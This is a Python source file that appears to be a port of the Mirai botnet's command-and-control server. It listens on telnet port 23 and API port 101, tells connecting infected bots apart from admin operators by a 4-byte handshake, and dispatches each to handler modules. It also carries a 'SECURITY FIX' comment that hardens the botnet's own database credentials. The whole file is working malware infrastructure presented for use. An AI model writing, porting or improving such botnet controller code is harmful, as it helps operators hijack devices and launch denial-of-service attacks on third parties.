import socket
import threading
import time
from dataclasses import dataclass
from typing import Dict, Optional

from .database import Database
from .client_list import ClientList
from .admin import Admin
from .bot import Bot
from .api import Api

import os

# SECURITY FIX: Use environment variables instead of hardcoded credentials
DATABASE_ADDR = os.getenv("DATABASE_ADDR", "127.0.0.1")
DATABASE_USER = os.getenv("DATABASE_USER", "root")
DATABASE_PASS = os.getenv("DATABASE_PASSWORD")
DATABASE_TABLE = os.getenv("DATABASE_TABLE", "mirai")

if not DATABASE_PASS:
    raise ValueError("DATABASE_PASSWORD environment variable must be set")

class CNCServer:
    def __init__(self):
        self.client_list = ClientList()
        self.database = Database(DATABASE_ADDR, DATABASE_USER, DATABASE_PASS, DATABASE_TABLE)
        
    def start(self):
        # Start telnet server
        telnet_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        telnet_sock.bind(('0.0.0.0', 23))
        telnet_sock.listen(5)

        # Start API server
        api_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        api_sock.bind(('0.0.0.0', 101))
        api_sock.listen(5)

        # Start API handler thread
        api_thread = threading.Thread(target=self._api_handler, args=(api_sock,))
        api_thread.daemon = True
        api_thread.start()

        # Main telnet accept loop
        while True:
            try:
                client, addr = telnet_sock.accept()
                thread = threading.Thread(target=self._initial_handler, args=(client,))
                thread.daemon = True
                thread.start()
            except:
                break

        print("Stopped accepting clients")

    def _api_handler(self, sock: socket.socket):
        while True:
            try:
                client, addr = sock.accept()
                thread = threading.Thread(target=self._handle_api_client, args=(client,))
                thread.daemon = True
                thread.start()
            except:
                break

    def _initial_handler(self, client: socket.socket):
        try:
            client.settimeout(10)
            
            # Read initial 32 bytes
            data = client.recv(32)
            if not data or len(data) <= 0:
                client.close()
                return

            if len(data) == 4 and data[0] == 0x00 and data[1] == 0x00 and data[2] == 0x00:
                if data[3] > 0:
                    # Read source length
                    str_len = client.recv(1)
                    if not str_len:
                        client.close()
                        return
                        
                    source = ""
                    if str_len[0] > 0:
                        source_data = client.recv(str_len[0])
                        if not source_data:
                            client.close()
                            return
                        source = source_data.decode('utf-8')
                    
                    bot = Bot(client, data[3], source)
                    bot.handle()
                else:
                    bot = Bot(client, data[3], "")
                    bot.handle()
            else:
                admin = Admin(client)
                admin.handle()
                
        except Exception as e:
            print(f"Error handling client: {e}")
        finally:
            client.close()

    def _handle_api_client(self, client: socket.socket):
        try:
            api = Api(client)
            api.handle()
        finally:
            client.close()

def main():
    server = CNCServer()
    server.start()

if __name__ == "__main__":
    main()
